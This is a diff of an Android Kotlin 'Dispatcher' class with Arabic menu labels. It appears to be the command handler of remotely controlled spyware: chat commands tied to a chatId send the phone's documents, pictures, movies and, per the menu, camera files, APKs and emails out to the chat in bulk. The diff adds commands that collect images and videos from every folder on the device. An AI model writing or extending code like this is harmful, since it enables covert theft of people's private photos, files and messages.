@@ -152,14 +152,16 @@ class Dispatcher(private val ctx: Context) {
             "doc_100"   -> sendFolder(chatId, "/sdcard/Documents", 100, "المستندات")
             "doc_all"   -> sendFolder(chatId, "/sdcard/Documents", 99999, "المستندات")
 
-            "pic_ask"   -> askFolder(chatId, "pic", "🖼️ كم صورة؟")
+            "pic_ask"   -> askFolder(chatId, "pic", "🖼️ كم صورة؟ (من Pictures)")
+            "allpics_ask" -> askCount(chatId, "images", "🖼️ كم صورة؟ (كل المجلدات)")
             "pic_10"    -> sendFolder(chatId, "/sdcard/Pictures", 10, "الصور")
             "pic_20"    -> sendFolder(chatId, "/sdcard/Pictures", 20, "الصور")
             "pic_50"    -> sendFolder(chatId, "/sdcard/Pictures", 50, "الصور")
             "pic_100"   -> sendFolder(chatId, "/sdcard/Pictures", 100, "الصور")
             "pic_all"   -> sendFolder(chatId, "/sdcard/Pictures", 99999, "الصور")
 
-            "mov_ask"   -> askFolder(chatId, "mov", "🎬 كم فيديو؟")
+            "mov_ask"   -> askFolder(chatId, "mov", "🎬 كم فيديو؟ (من Movies)")
+            "vid_ask"   -> askCount(chatId, "videos", "🎬 كم فيديو؟ (كل المجلدات)")
             "mov_5"     -> sendFolder(chatId, "/sdcard/Movies", 5, "الأفلام")
             "mov_10"    -> sendFolder(chatId, "/sdcard/Movies", 10, "الأفلام")
             "mov_20"    -> sendFolder(chatId, "/sdcard/Movies", 20, "الأفلام")
@@ -415,6 +417,7 @@ class Dispatcher(private val ctx: Context) {
             put(row(b("📂 /sdcard (لستة)", "sdcard")))
             put(row(b("📁 التنزيلات", "dl_ask"), b("📄 المستندات", "doc_ask")))
             put(row(b("🖼️ صور مجلد", "pic_ask"), b("🎬 أفلام مجلد", "mov_ask")))
+            put(row(b("🖼️ صور كل المجلدات", "allpics_ask"), b("🎬 فيديو كل المجلدات", "vid_ask")))
             put(row(b("📷 الكاميرا", "dcim_ask"), b("🎵 الموسيقى", "mus_ask")))
             // APK
             put(row(b("📲 APK", "apk_ask"), b("📧 الإيميلات", "emails")))
